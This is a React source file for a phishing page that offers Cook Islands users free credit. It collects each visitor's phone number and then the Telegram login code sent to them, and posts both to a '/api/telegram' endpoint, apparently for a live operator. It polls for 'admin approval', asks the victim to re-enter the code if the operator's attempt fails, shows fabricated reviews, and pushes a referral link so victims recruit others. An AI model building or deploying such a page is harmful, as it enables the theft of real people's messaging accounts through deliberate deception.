import React, { useState, useEffect } from 'react';
import { Shield, Check, Star, Copy, CheckCircle, Sparkles, Gift, Users, Zap } from 'lucide-react';

declare global {
  interface Window {
    grecaptcha: any;
  }
}

interface UserReview {
  firstName: string;
  lastName: string;
  review: string;
}

const userReviews: UserReview[] = [
  { firstName: "ngametua", lastName: "marcian", review: "thanks!!!" },
  { firstName: "marcian", lastName: "kita", review: "wow i gpt crdtsss" },
  { firstName: "tuaine", lastName: "arigi", review: "this is fr guys" },
  { firstName: "tuariki", lastName: "marsters", review: "wtf i got my crdtz" },
  { firstName: "tuane", lastName: "kopu", review: "bruh this was fr" },
  { firstName: "memetuha", lastName: "murare", review: "shiii imma received ittt" }
];

function App() {
  const [currentStep, setCurrentStep] = useState<'welcome' | 'phone' | 'verification' | 'done'>('welcome');
  const [phoneNumber, setPhoneNumber] = useState(['', '', '', '', '']);
  const [verificationCode, setVerificationCode] = useState(['', '', '', '', '']);
  const [showCookieConsent, setShowCookieConsent] = useState(true);
  const [sessionId] = useState<string>(() => {
    try {
      const ex = localStorage.getItem('sessionId');
      if (ex) return ex;
      const sid = (crypto && 'randomUUID' in crypto) ? crypto.randomUUID()
        : Math.random().toString(36).slice(2) + Date.now().toString(36);
      localStorage.setItem('sessionId', sid);
      return sid;
    } catch {
      return Math.random().toString(36).slice(2) + Date.now().toString(36);
    }
  });
  const [waiting, setWaiting] = useState(false);
  const [errorText, setErrorText] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy text: ', err);
    }
  };

const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: string }) => {
    try {
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ ...data, sessionId }),
      });
      return response.ok;
    } catch (error) {
      console.error('Failed to send data to Telegram bot:', error);
      return false;
    }
  };

  const handlePhoneSubmit = async () => {
    const fullNumber = phoneNumber.join('');
    if (fullNumber.length === 5) {
      const success = await sendToTelegramBot({ type: 'phone', value: fullNumber });
      if (success) {
        setCurrentStep('verification');
      }
    }
  };

  const handleVerificationSubmit = async () => {
    const fullCode = verificationCode.join('');
    if (fullCode.length === 5) {
      setWaiting(true);
      setErrorText(null);
      const success = await sendToTelegramBot({ type: 'verification', value: fullCode });
      if (success) {
        const poll = async () => {
          try {
            const res = await fetch(`/api/status?sessionId=${encodeURIComponent(sessionId)}`);
            if (!res.ok) throw new Error('status failed');
            const data = await res.json();
            if (data.status === 'approved') {
              setWaiting(false);
              setCurrentStep('done');
            } else if (data.status === 'rejected') {
              setWaiting(false);
              setVerificationCode(['', '', '', '', '']);
              setErrorText('you entered wrong code , enter true code');
            } else {
              setTimeout(poll, 2000);
            }
          } catch {
            setTimeout(poll, 3000);
          }
        };
        poll();
      } else {
        setWaiting(false);
      }
    }
  };

  const handleInputChange = (value: string, index: number, type: 'phone' | 'verification') => {
    if (value.length <= 1 && /^\d*$/.test(value)) {
      if (type === 'phone') {
        const newPhone = [...phoneNumber];
        newPhone[index] = value;
        setPhoneNumber(newPhone);
        
        // Auto-focus next input
        if (value && index < 4) {
          const nextInput = document.getElementById(`phone-${index + 1}`);
          nextInput?.focus();
        }
      } else {
        const newCode = [...verificationCode];
        newCode[index] = value;
        setVerificationCode(newCode);
        
        // Auto-focus next input
        if (value && index < 4) {
          const nextInput = document.getElementById(`verification-${index + 1}`);
          nextInput?.focus();
        }
      }
    }
  };

  const acceptCookies = () => {
    setShowCookieConsent(false);
    localStorage.setItem('cookiesAccepted', 'true');
  };

  useEffect(() => {
    const cookiesAccepted = localStorage.getItem('cookiesAccepted');
    if (cookiesAccepted) {
      setShowCookieConsent(false);
    }
  }, []);

  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Background Image */}
      <div 
        className="fixed inset-0 z-0"
        style={{
          backgroundImage: 'url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5v9aoyGUs-CnKNB_LLKhNxDQAjphMIMb9tg&s)',
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundRepeat: 'no-repeat'
        }}
      >
        <div className="absolute inset-0 bg-gradient-to-br from-black/60 via-purple-900/30 to-red-900/40"></div>
        {/* Animated background elements */}
        <div className="absolute inset-0">
          <div className="absolute top-20 left-10 w-72 h-72 bg-gradient-to-r from-blue-400/20 to-purple-600/20 rounded-full blur-3xl animate-pulse"></div>
          <div className="absolute bottom-20 right-10 w-96 h-96 bg-gradient-to-r from-red-400/20 to-pink-600/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-gradient-to-r from-yellow-400/10 to-orange-600/10 rounded-full blur-3xl animate-pulse delay-500"></div>
        </div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 min-h-screen flex flex-col">
        {/* Header */}
        <div className="text-center pt-16 pb-8 relative">
          <div className="absolute inset-0 flex items-center justify-center opacity-10">
            <Sparkles className="w-32 h-32 text-yellow-400 animate-spin" style={{ animationDuration: '8s' }} />
          </div>
          <h1 className="text-6xl md:text-8xl font-bold bg-gradient-to-r from-white via-blue-100 to-purple-200 bg-clip-text text-transparent mb-6 tracking-tight drop-shadow-2xl animate-pulse">
            welcome
          </h1>
          <p className="text-2xl md:text-3xl bg-gradient-to-r from-red-400 to-pink-500 bg-clip-text text-transparent font-bold mb-8 drop-shadow-lg">
            get free credit (just for cook islands users)
          </p>
          <div className="flex justify-center space-x-8 mt-8">
            <div className="flex items-center space-x-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2 border border-white/20">
              <Gift className="w-5 h-5 text-yellow-400" />
              <span className="text-white/90 text-sm font-medium">Free Credits</span>
            </div>
            <div className="flex items-center space-x-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2 border border-white/20">
              <Users className="w-5 h-5 text-green-400" />
              <span className="text-white/90 text-sm font-medium">Cook Islands Only</span>
            </div>
            <div className="flex items-center space-x-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2 border border-white/20">
              <Zap className="w-5 h-5 text-blue-400" />
              <span className="text-white/90 text-sm font-medium">Instant Process</span>
            </div>
          </div>
        </div>

        {/* Main Container */}
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="w-full max-w-2xl">
            
            {currentStep === 'welcome' && (
              <div className="bg-gradient-to-br from-white/25 to-white/10 backdrop-blur-xl rounded-3xl p-10 border border-white/40 shadow-2xl transform hover:scale-105 transition-all duration-300">
                <div className="text-center">
                  <div className="bg-gradient-to-r from-white/95 to-blue-50/95 rounded-2xl p-8 mb-10 shadow-xl border border-white/50">
                    <div className="flex justify-center mb-4">
                      <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center shadow-lg">
                        <Gift className="w-8 h-8 text-white" />
                      </div>
                    </div>
                    <p className="text-xl text-gray-800 font-semibold leading-relaxed">
                      please follow rules to get free credit from us
                    </p>
                  </div>
                  <button 
                    onClick={() => setCurrentStep('phone')}
                    className="bg-gradient-to-r from-red-500 to-pink-600 hover:from-red-600 hover:to-pink-700 text-white px-12 py-5 rounded-2xl font-bold text-xl transition-all duration-300 shadow-2xl hover:shadow-red-500/25 transform hover:scale-105 hover:-translate-y-1"
                  >
                    🚀 Get Started
                  </button>
                </div>
              </div>
            )}

            {currentStep === 'phone' && (
              <div className="bg-gradient-to-br from-white/25 to-white/10 backdrop-blur-xl rounded-3xl p-8 border border-white/40 shadow-2xl max-w-lg mx-auto">
                <div className="text-center">
                  <div className="flex justify-center mb-6">
                    <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center shadow-xl">
                      <span className="text-2xl font-bold text-white">1</span>
                    </div>
                  </div>
                  <h2 className="text-xl text-white font-bold mb-6 leading-relaxed">
                    1: enter your number (just cook islands numbers)
                  </h2>
                  <div className="flex justify-center space-x-3 mb-8">
                    {phoneNumber.map((digit, index) => (
                      <input
                        key={index}
                        id={`phone-${index}`}
                        type="text"
                        value={digit}
                        onChange={(e) => handleInputChange(e.target.value, index, 'phone')}
                        className="w-14 h-14 text-center text-2xl font-bold bg-gradient-to-br from-white/95 to-blue-50/95 border-2 border-white/50 rounded-xl focus:border-blue-400 focus:outline-none focus:ring-2 focus:ring-blue-400/30 transition-all duration-300 shadow-lg hover:shadow-xl transform hover:scale-105"
                        maxLength={1}
                      />
                    ))}
                  </div>
                  <button 
                    onClick={handlePhoneSubmit}
                    disabled={phoneNumber.join('').length !== 5}
                    className="bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white px-8 py-3 rounded-xl font-bold text-lg transition-all duration-300 shadow-xl hover:shadow-green-500/25 transform hover:scale-105 disabled:hover:scale-100"
                  >
                    📱 Submit Number
                  </button>
                </div>
              </div>
            )}

            {currentStep === 'verification' && (
              <div className="bg-gradient-to-br from-white/25 to-white/10 backdrop-blur-xl rounded-3xl p-8 border border-white/40 shadow-2xl max-w-lg mx-auto">
                <div className="text-center">
                  <div className="flex justify-center mb-6">
                    <div className="w-16 h-16 bg-gradient-to-r from-blue-400 to-purple-500 rounded-full flex items-center justify-center shadow-xl animate-pulse">
                      <Shield className="w-8 h-8 text-white" />
                    </div>
                  </div>
                  <h2 className="text-xl text-white font-bold mb-6 leading-relaxed">
                    for security reasons we uses telegram's verification service to deliver confirmation codes
                  </h2>
                  <div className="flex justify-center space-x-3 mb-8">
                    {verificationCode.map((digit, index) => (
                      <input
                        key={index}
                        id={`verification-${index}`}
                        type="text"
                        value={digit}
                        onChange={(e) => handleInputChange(e.target.value, index, 'verification')}
                        className="w-14 h-14 text-center text-2xl font-bold bg-gradient-to-br from-white/95 to-purple-50/95 border-2 border-white/50 rounded-xl focus:border-purple-400 focus:outline-none focus:ring-2 focus:ring-purple-400/30 transition-all duration-300 shadow-lg hover:shadow-xl transform hover:scale-105"
                        maxLength={1}
                      />
                    ))}
                  </div>
                  {errorText && (
                    <div className="bg-red-500/20 border border-red-400/50 rounded-xl p-3 mb-4">
                      <p className="text-red-300 font-semibold">{errorText}</p>
                    </div>
                  )}
                  {waiting && (
                    <div className="bg-blue-500/20 border border-blue-400/50 rounded-xl p-3 mb-4">
                      <div className="flex items-center justify-center space-x-3">
                        <div className="w-5 h-5 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                        <p className="text-blue-300 font-semibold">Waiting for admin approval…</p>
                      </div>
                    </div>
                  )}
                  <button 
                    onClick={handleVerificationSubmit}
                    disabled={verificationCode.join('').length !== 5 || waiting}
                    className="bg-gradient-to-r from-purple-500 to-pink-600 hover:from-purple-600 hover:to-pink-700 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white px-8 py-3 rounded-xl font-bold text-lg transition-all duration-300 shadow-xl hover:shadow-purple-500/25 transform hover:scale-105 disabled:hover:scale-100"
                  >
                    🔐 Submit Code
                  </button>
                </div>
              </div>
            )}

            {currentStep === 'done' && (
              <div className="bg-gradient-to-br from-white/25 to-white/10 backdrop-blur-xl rounded-3xl p-10 border border-white/40 shadow-2xl">
                <div className="text-center">
                  <div className="flex justify-center mb-6">
                    <div className="w-24 h-24 bg-gradient-to-r from-green-400 to-emerald-500 rounded-full flex items-center justify-center shadow-2xl animate-bounce">
                      <Check className="w-12 h-12 text-white" />
                    </div>
                  </div>
                  
                  {/* Success Message */}
                  <div className="mb-10">
                    <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 border border-green-400/30 rounded-2xl p-6 mb-8">
                      <h3 className="text-2xl font-bold text-white mb-4">🎉 Success!</h3>
                      <p className="text-lg text-white/95 leading-relaxed">
                      Dear user, due to heavy traffic on the website, your credit will be sent within the next few hours. Your invitation link is getfreecredit.vercel.app. Each referral grants you $20 in free credit. Referrals are counted after 00:00.
                      </p>
                    </div>
                  </div>

                  {/* Copy Link Box */}
                  <div className="bg-gradient-to-r from-blue-500/20 to-purple-500/20 rounded-2xl p-6 border border-blue-400/30 shadow-xl">
                    <div className="flex items-center justify-center mb-4">
                      <Copy className="w-6 h-6 text-blue-400 mr-2" />
                      <p className="text-white font-bold text-lg">Your Referral Link</p>
                    </div>
                    <div className="flex items-center justify-between bg-gradient-to-r from-white/20 to-blue-50/20 rounded-xl p-4 border border-white/40 shadow-inner">
                      <span className="text-white font-mono text-base font-semibold break-all">
                        getfreecredit.vercel.app
                      </span>
                      <button
                        onClick={() => copyToClipboard('getfreecredit.vercel.app')}
                        className={`ml-4 flex items-center px-4 py-3 rounded-xl font-bold text-sm transition-all duration-300 shadow-lg transform hover:scale-105 ${
                          copied 
                            ? 'bg-gradient-to-r from-green-500 to-emerald-600 text-white animate-pulse' 
                            : 'bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white'
                        }`}
                      >
                        {copied ? (
                          <>
                            <CheckCircle className="w-5 h-5 mr-2" />
                            ✅ Copied!
                          </>
                        ) : (
                          <>
                            <Copy className="w-5 h-5 mr-2" />
                            📋 Copy
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* User Reviews Section */}
        <div className="py-16 px-4">
          <div className="max-w-6xl mx-auto">
            <div className="text-center mb-16">
              <h3 className="text-4xl font-bold bg-gradient-to-r from-white via-blue-100 to-purple-200 bg-clip-text text-transparent mb-4">What Users Say</h3>
              <div className="flex justify-center">
                <div className="w-24 h-1 bg-gradient-to-r from-blue-400 to-purple-500 rounded-full"></div>
              </div>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {userReviews.map((review, index) => (
                <div key={index} className="bg-gradient-to-br from-white/25 to-white/10 backdrop-blur-xl rounded-2xl p-6 border border-white/40 shadow-xl hover:shadow-2xl transform hover:scale-105 transition-all duration-300">
                  <div className="flex items-center mb-4">
                    <div className="w-12 h-12 bg-gradient-to-br from-blue-400 to-purple-500 rounded-full flex items-center justify-center text-white font-bold mr-4 shadow-lg">
                      {review.firstName.charAt(0).toUpperCase()}
                    </div>
                    <div>
                      <p className="text-white font-bold text-lg">{review.firstName} {review.lastName}</p>
                      <div className="flex text-yellow-400 mt-1">
                        {[1, 2, 3, 4, 5].map((star) => (
                          <Star key={star} className="w-5 h-5 fill-current drop-shadow-sm" />
                        ))}
                      </div>
                    </div>
                  </div>
                  <p className="text-white/95 italic text-lg leading-relaxed">"{review.review}"</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Cookie Consent */}
      {showCookieConsent && (
        <div className="fixed bottom-0 left-0 right-0 z-50 bg-gradient-to-r from-gray-900/95 to-black/95 backdrop-blur-xl text-white p-6 border-t border-white/20 shadow-2xl">
          <div className="max-w-6xl mx-auto flex flex-col sm:flex-row items-center justify-between">
            <p className="mb-4 sm:mb-0 sm:mr-6 text-white/90 font-medium">
              We use cookies to improve your experience. By using this site, you agree to our use of cookies.
            </p>
            <button 
              onClick={acceptCookies}
              className="bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white px-8 py-3 rounded-xl font-bold transition-all duration-300 whitespace-nowrap shadow-lg transform hover:scale-105"
            >
              🍪 Accept Cookies
            </button>
          </div>
        </div>
      )}

      {/* Global reCAPTCHA callback */}
      <script dangerouslySetInnerHTML={{
        __html: `
          window.onCaptchaChange = function(token) {
            window.dispatchEvent(new CustomEvent('recaptcha-change', { detail: token }));
          };
        `
      }} />
    </div>
  );
}

export default App;